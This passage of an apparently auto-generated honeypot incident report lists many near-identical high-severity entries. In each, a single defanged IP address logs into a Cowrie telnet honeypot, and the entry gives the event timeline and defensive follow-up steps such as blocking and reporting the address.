- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-96723f50209c

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]117` |
| **First Seen** | 2026-08-21 17:00 |
| **Last Seen** | 2026-08-21 17:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 17:00:48` | `cowrie.session.connect` |
| `2026-08-21 17:00:48` | `cowrie.telnet.option` |
| `2026-08-21 17:00:49` | `cowrie.telnet.option` |
| `2026-08-21 17:00:49` | `cowrie.login.success` |
| `2026-08-21 17:00:49` | `cowrie.session.params` |
| `2026-08-21 17:00:49` | `cowrie.log.closed` |
| `2026-08-21 17:00:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]117` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]117` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1172872aaa7b

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]117` |
| **First Seen** | 2026-08-21 17:00 |
| **Last Seen** | 2026-08-21 17:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 17:00:51` | `cowrie.session.connect` |
| `2026-08-21 17:00:52` | `cowrie.telnet.option` |
| `2026-08-21 17:00:53` | `cowrie.telnet.option` |
| `2026-08-21 17:00:53` | `cowrie.login.success` |
| `2026-08-21 17:00:53` | `cowrie.session.params` |
| `2026-08-21 17:00:53` | `cowrie.log.closed` |
| `2026-08-21 17:00:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]117` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]117` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-18710b0410db

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]117` |
| **First Seen** | 2026-08-21 17:00 |
| **Last Seen** | 2026-08-21 17:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 17:00:53` | `cowrie.session.connect` |
| `2026-08-21 17:00:54` | `cowrie.telnet.option` |
| `2026-08-21 17:00:55` | `cowrie.telnet.option` |
| `2026-08-21 17:00:55` | `cowrie.login.success` |
| `2026-08-21 17:00:55` | `cowrie.session.params` |
| `2026-08-21 17:00:55` | `cowrie.log.closed` |
| `2026-08-21 17:00:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]117` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]117` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ac5eb0907d9e

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]117` |
| **First Seen** | 2026-08-21 17:00 |
| **Last Seen** | 2026-08-21 17:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 17:00:55` | `cowrie.session.connect` |
| `2026-08-21 17:00:56` | `cowrie.telnet.option` |
| `2026-08-21 17:00:57` | `cowrie.telnet.option` |
| `2026-08-21 17:00:57` | `cowrie.login.success` |
| `2026-08-21 17:00:57` | `cowrie.session.params` |
| `2026-08-21 17:00:57` | `cowrie.log.closed` |
| `2026-08-21 17:00:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]117` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]117` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5deda32f3221

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]117` |
| **First Seen** | 2026-08-21 17:00 |
| **Last Seen** | 2026-08-21 17:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 17:00:57` | `cowrie.session.connect` |
| `2026-08-21 17:00:58` | `cowrie.telnet.option` |
| `2026-08-21 17:00:58` | `cowrie.telnet.option` |
| `2026-08-21 17:00:58` | `cowrie.login.success` |
| `2026-08-21 17:00:59` | `cowrie.session.params` |
| `2026-08-21 17:00:59` | `cowrie.log.closed` |
| `2026-08-21 17:00:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]117` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]117` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c8d8c4c9eca5

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]117` |
| **First Seen** | 2026-08-21 17:00 |
| **Last Seen** | 2026-08-21 17:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 17:00:59` | `cowrie.session.connect` |
| `2026-08-21 17:01:00` | `cowrie.telnet.option` |
| `2026-08-21 17:01:00` | `cowrie.telnet.option` |
| `2026-08-21 17:01:00` | `cowrie.login.success` |
| `2026-08-21 17:01:01` | `cowrie.session.params` |
| `2026-08-21 17:01:01` | `cowrie.log.closed` |
| `2026-08-21 17:01:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]117` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]117` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e08a62041f5c

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]117` |
| **First Seen** | 2026-08-21 17:01 |
| **Last Seen** | 2026-08-21 17:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 17:01:03` | `cowrie.session.connect` |
| `2026-08-21 17:01:03` | `cowrie.telnet.option` |
| `2026-08-21 17:01:04` | `cowrie.telnet.option` |
| `2026-08-21 17:01:04` | `cowrie.login.success` |
| `2026-08-21 17:01:05` | `cowrie.session.params` |
| `2026-08-21 17:01:05` | `cowrie.log.closed` |
| `2026-08-21 17:01:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]117` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]117` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-758551725141

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]117` |
| **First Seen** | 2026-08-21 17:01 |
| **Last Seen** | 2026-08-21 17:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 17:01:05` | `cowrie.session.connect` |
| `2026-08-21 17:01:05` | `cowrie.telnet.option` |
| `2026-08-21 17:01:06` | `cowrie.telnet.option` |
| `2026-08-21 17:01:06` | `cowrie.login.success` |
| `2026-08-21 17:01:07` | `cowrie.session.params` |
| `2026-08-21 17:01:07` | `cowrie.log.closed` |
| `2026-08-21 17:01:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]117` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]117` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-389c5b0b5c18

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]117` |
| **First Seen** | 2026-08-21 17:01 |
| **Last Seen** | 2026-08-21 17:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 17:01:07` | `cowrie.session.connect` |
| `2026-08-21 17:01:07` | `cowrie.telnet.option` |
| `2026-08-21 17:01:08` | `cowrie.telnet.option` |
| `2026-08-21 17:01:08` | `cowrie.login.success` |
| `2026-08-21 17:01:08` | `cowrie.session.params` |
| `2026-08-21 17:01:08` | `cowrie.log.closed` |
| `2026-08-21 17:01:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]117` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]117` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-05595462fff3

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]117` |
| **First Seen** | 2026-08-21 17:01 |
| **Last Seen** | 2026-08-21 17:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 17:01:08` | `cowrie.session.connect` |
| `2026-08-21 17:01:09` | `cowrie.telnet.option` |
| `2026-08-21 17:01:10` | `cowrie.telnet.option` |
| `2026-08-21 17:01:10` | `cowrie.login.success` |
| `2026-08-21 17:01:10` | `cowrie.session.params` |
| `2026-08-21 17:01:10` | `cowrie.log.closed` |
| `2026-08-21 17:01:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]117` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]117` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c384539cd14c

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]117` |
| **First Seen** | 2026-08-21 17:01 |
| **Last Seen** | 2026-08-21 17:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 17:01:10` | `cowrie.session.connect` |
| `2026-08-21 17:01:11` | `cowrie.telnet.option` |
| `2026-08-21 17:01:12` | `cowrie.telnet.option` |
| `2026-08-21 17:01:12` | `cowrie.login.success` |
| `2026-08-21 17:01:12` | `cowrie.session.params` |
| `2026-08-21 17:01:12` | `cowrie.log.closed` |
| `2026-08-21 17:01:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]117` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]117` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ffa21a9928ba

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]117` |
| **First Seen** | 2026-08-21 17:01 |
| **Last Seen** | 2026-08-21 17:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 17:01:12` | `cowrie.session.connect` |
| `2026-08-21 17:01:13` | `cowrie.telnet.option` |
| `2026-08-21 17:01:14` | `cowrie.telnet.option` |
| `2026-08-21 17:01:14` | `cowrie.login.success` |
| `2026-08-21 17:01:14` | `cowrie.session.params` |
| `2026-08-21 17:01:14` | `cowrie.log.closed` |
| `2026-08-21 17:01:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]117` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]117` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1b655ec1b0c1

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]117` |
| **First Seen** | 2026-08-21 17:01 |
| **Last Seen** | 2026-08-21 17:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 17:01:14` | `cowrie.session.connect` |
| `2026-08-21 17:01:15` | `cowrie.telnet.option` |
| `2026-08-21 17:01:15` | `cowrie.telnet.option` |
| `2026-08-21 17:01:15` | `cowrie.login.success` |
| `2026-08-21 17:01:16` | `cowrie.session.params` |
| `2026-08-21 17:01:16` | `cowrie.log.closed` |
| `2026-08-21 17:01:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]117` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]117` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aed5b2bf59e2

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]117` |
| **First Seen** | 2026-08-21 17:01 |
| **Last Seen** | 2026-08-21 17:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 17:01:16` | `cowrie.session.connect` |
| `2026-08-21 17:01:17` | `cowrie.telnet.option` |
| `2026-08-21 17:01:17` | `cowrie.telnet.option` |
| `2026-08-21 17:01:17` | `cowrie.login.success` |
| `2026-08-21 17:01:18` | `cowrie.session.params` |
| `2026-08-21 17:01:18` | `cowrie.log.closed` |
| `2026-08-21 17:01:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]117` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]117` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0fe313da477f

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]117` |
| **First Seen** | 2026-08-21 17:01 |
| **Last Seen** | 2026-08-21 17:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 17:01:18` | `cowrie.session.connect` |
| `2026-08-21 17:01:19` | `cowrie.telnet.option` |
| `2026-08-21 17:01:19` | `cowrie.telnet.option` |
| `2026-08-21 17:01:19` | `cowrie.login.success` |
| `2026-08-21 17:01:20` | `cowrie.session.params` |
| `2026-08-21 17:01:20` | `cowrie.log.closed` |
| `2026-08-21 17:01:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]117` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]117` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-18cfc8781eae

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]117` |
| **First Seen** | 2026-08-21 17:01 |
| **Last Seen** | 2026-08-21 17:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 17:01:20` | `cowrie.session.connect` |
| `2026-08-21 17:01:20` | `cowrie.telnet.option` |
| `2026-08-21 17:01:21` | `cowrie.telnet.option` |
| `2026-08-21 17:01:21` | `cowrie.login.success` |
| `2026-08-21 17:01:22` | `cowrie.session.params` |
| `2026-08-21 17:01:22` | `cowrie.log.closed` |
| `2026-08-21 17:01:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]117` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]117` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3c607cc0cea4

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]117` |
| **First Seen** | 2026-08-21 17:01 |
| **Last Seen** | 2026-08-21 17:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 17:01:22` | `cowrie.session.connect` |
| `2026-08-21 17:01:22` | `cowrie.telnet.option` |
| `2026-08-21 17:01:23` | `cowrie.telnet.option` |
| `2026-08-21 17:01:23` | `cowrie.login.success` |
| `2026-08-21 17:01:23` | `cowrie.session.params` |
| `2026-08-21 17:01:23` | `cowrie.log.closed` |
| `2026-08-21 17:01:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]117` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]117` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-765b52cda36a

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]117` |
| **First Seen** | 2026-08-21 17:01 |
| **Last Seen** | 2026-08-21 17:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 17:01:23` | `cowrie.session.connect` |
| `2026-08-21 17:01:24` | `cowrie.telnet.option` |
| `2026-08-21 17:01:25` | `cowrie.telnet.option` |
| `2026-08-21 17:01:25` | `cowrie.login.success` |
| `2026-08-21 17:01:25` | `cowrie.session.params` |
| `2026-08-21 17:01:25` | `cowrie.log.closed` |
| `2026-08-21 17:01:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]117` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]117` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ce980f58f6bc

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]117` |
| **First Seen** | 2026-08-21 17:01 |
| **Last Seen** | 2026-08-21 17:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 17:01:25` | `cowrie.session.connect` |
| `2026-08-21 17:01:26` | `cowrie.telnet.option` |
| `2026-08-21 17:01:27` | `cowrie.telnet.option` |
| `2026-08-21 17:01:27` | `cowrie.login.success` |
| `2026-08-21 17:01:27` | `cowrie.session.params` |
| `2026-08-21 17:01:27` | `cowrie.log.closed` |
| `2026-08-21 17:01:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]117` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]117` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-85a4901725ed

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]117` |
| **First Seen** | 2026-08-21 17:01 |
| **Last Seen** | 2026-08-21 17:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 17:01:27` | `cowrie.session.connect` |
| `2026-08-21 17:01:28` | `cowrie.telnet.option` |
| `2026-08-21 17:01:29` | `cowrie.telnet.option` |
| `2026-08-21 17:01:29` | `cowrie.login.success` |
| `2026-08-21 17:01:29` | `cowrie.session.params` |
| `2026-08-21 17:01:29` | `cowrie.log.closed` |
| `2026-08-21 17:01:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]117` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]117` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b7d9f5d900cd

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]117` |
| **First Seen** | 2026-08-21 17:01 |
| **Last Seen** | 2026-08-21 17:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 17:01:29` | `cowrie.session.connect` |
| `2026-08-21 17:01:30` | `cowrie.telnet.option` |
| `2026-08-21 17:01:30` | `cowrie.telnet.option` |
| `2026-08-21 17:01:30` | `cowrie.login.success` |
| `2026-08-21 17:01:31` | `cowrie.session.params` |
| `2026-08-21 17:01:31` | `cowrie.log.closed` |
| `2026-08-21 17:01:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]117` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]117` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7d11e1338295

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]117` |
| **First Seen** | 2026-08-21 17:01 |
| **Last Seen** | 2026-08-21 17:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 17:01:31` | `cowrie.session.connect` |
| `2026-08-21 17:01:32` | `cowrie.telnet.option` |
| `2026-08-21 17:01:32` | `cowrie.telnet.option` |
| `2026-08-21 17:01:32` | `cowrie.login.success` |
| `2026-08-21 17:01:33` | `cowrie.session.params` |
| `2026-08-21 17:01:33` | `cowrie.log.closed` |
| `2026-08-21 17:01:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]117` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]117` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ae4be17eb970

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]117` |
| **First Seen** | 2026-08-21 17:01 |
| **Last Seen** | 2026-08-21 17:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 17:01:33` | `cowrie.session.connect` |
| `2026-08-21 17:01:34` | `cowrie.telnet.option` |
| `2026-08-21 17:01:34` | `cowrie.telnet.option` |
| `2026-08-21 17:01:34` | `cowrie.login.success` |
| `2026-08-21 17:01:35` | `cowrie.session.params` |
| `2026-08-21 17:01:35` | `cowrie.log.closed` |
| `2026-08-21 17:01:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]117` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]117` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-afa27db5ab2d

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]117` |
| **First Seen** | 2026-08-21 17:01 |
| **Last Seen** | 2026-08-21 17:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 17:01:35` | `cowrie.session.connect` |
| `2026-08-21 17:01:36` | `cowrie.telnet.option` |
| `2026-08-21 17:01:36` | `cowrie.telnet.option` |
| `2026-08-21 17:01:36` | `cowrie.login.success` |
| `2026-08-21 17:01:37` | `cowrie.session.params` |
| `2026-08-21 17:01:37` | `cowrie.log.closed` |
| `2026-08-21 17:01:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]117` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]117` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a741061e2388

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]117` |
| **First Seen** | 2026-08-21 17:01 |
| **Last Seen** | 2026-08-21 17:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 17:01:37` | `cowrie.session.connect` |
| `2026-08-21 17:01:37` | `cowrie.telnet.option` |
| `2026-08-21 17:01:38` | `cowrie.telnet.option` |
| `2026-08-21 17:01:38` | `cowrie.login.success` |
| `2026-08-21 17:01:39` | `cowrie.session.params` |
| `2026-08-21 17:01:39` | `cowrie.log.closed` |
| `2026-08-21 17:01:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]117` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]117` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f1dc8173891b

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]117` |
| **First Seen** | 2026-08-21 17:01 |
| **Last Seen** | 2026-08-21 17:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 17:01:39` | `cowrie.session.connect` |
| `2026-08-21 17:01:39` | `cowrie.telnet.option` |
| `2026-08-21 17:01:40` | `cowrie.telnet.option` |
| `2026-08-21 17:01:40` | `cowrie.login.success` |
| `2026-08-21 17:01:40` | `cowrie.session.params` |
| `2026-08-21 17:01:40` | `cowrie.log.closed` |
| `2026-08-21 17:01:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]117` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]117` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dc7be30c45e8

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]117` |
| **First Seen** | 2026-08-21 17:01 |
| **Last Seen** | 2026-08-21 17:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 17:01:41` | `cowrie.session.connect` |
| `2026-08-21 17:01:41` | `cowrie.telnet.option` |
| `2026-08-21 17:01:42` | `cowrie.telnet.option` |
| `2026-08-21 17:01:42` | `cowrie.login.success` |
| `2026-08-21 17:01:42` | `cowrie.session.params` |
| `2026-08-21 17:01:42` | `cowrie.log.closed` |
| `2026-08-21 17:01:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]117` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]117` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-71fed1b9e128

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]117` |
| **First Seen** | 2026-08-21 17:01 |
| **Last Seen** | 2026-08-21 17:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 17:01:42` | `cowrie.session.connect` |
| `2026-08-21 17:01:43` | `cowrie.telnet.option` |
| `2026-08-21 17:01:44` | `cowrie.telnet.option` |
| `2026-08-21 17:01:44` | `cowrie.login.success` |
| `2026-08-21 17:01:44` | `cowrie.session.params` |
| `2026-08-21 17:01:44` | `cowrie.log.closed` |
| `2026-08-21 17:01:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]117` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]117` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4c14b9181a9e

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]117` |
| **First Seen** | 2026-08-21 17:01 |
| **Last Seen** | 2026-08-21 17:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 17:01:44` | `cowrie.session.connect` |
| `2026-08-21 17:01:45` | `cowrie.telnet.option` |
| `2026-08-21 17:01:46` | `cowrie.telnet.option` |
| `2026-08-21 17:01:46` | `cowrie.login.success` |
| `2026-08-21 17:01:46` | `cowrie.session.params` |
| `2026-08-21 17:01:46` | `cowrie.log.closed` |
| `2026-08-21 17:01:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]117` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]117` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f9d8e588e9d8

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]117` |
| **First Seen** | 2026-08-21 17:01 |
| **Last Seen** | 2026-08-21 17:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
